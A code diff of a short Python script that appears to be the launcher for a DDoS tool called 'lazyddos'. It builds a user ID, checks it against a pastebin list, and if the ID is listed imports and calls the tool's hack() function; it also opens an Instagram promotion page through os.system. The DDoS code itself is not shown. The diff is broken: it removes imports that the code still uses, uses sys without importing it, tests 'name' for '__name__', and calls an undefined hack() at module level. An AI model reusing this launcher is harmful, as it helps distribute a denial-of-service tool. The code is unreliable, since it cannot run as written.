@@ -1,24 +1,35 @@
-import uuid
-import requests
-import time
-import os
+def baha():
+    uuid = str(os.geteuid()) + str(os.getlogin())
+    id = "-".join(uuid)
+    print("\x1b[37;1mYour ID : "+id)
+    try:
+        httpCaht = requests.get("https://pastebin.com/2WuEPjdc").text
+        if id in httpCaht:
+            print("\x1b[37;1mYOUR ID IS ACTIVE.........")
+            msg = str(os.geteuid())
+            time.sleep(1)
+            from lazyddos import hack
+            hack()
+            
+        else:
+            print("\x1b[37;1mYOUR ID IS NOT ACTIVE.........")
+            time.sleep(1)
+            sys.exit()
+    except:
+        sys.exit()
 
-c = input("nawt chia? ")
-    
-e = str(uuid.uuid5(uuid.NAMESPACE_DNS, c))
-print("")
-print(e)
-g = requests.get("https://pastebin.com/2WuEPjdc")
+    if name == '__main__':
+        baha()
 
-if e in g.text:
-    print("active")
-    time.sleep(2)
-    from lazyddos import hack
-    hack()
-    
-else:
-    print("id'akat active nia ")
-    print("")
-    print("nama bo instakam bnera")
-    print("")
-    print(" instagram: ara_software")
+os.system('xdg-open https://www.instagram.com/ara_software/')
+os.system('clear')
+
+
+
+
+
+baha()
+
+
+         
+hack()
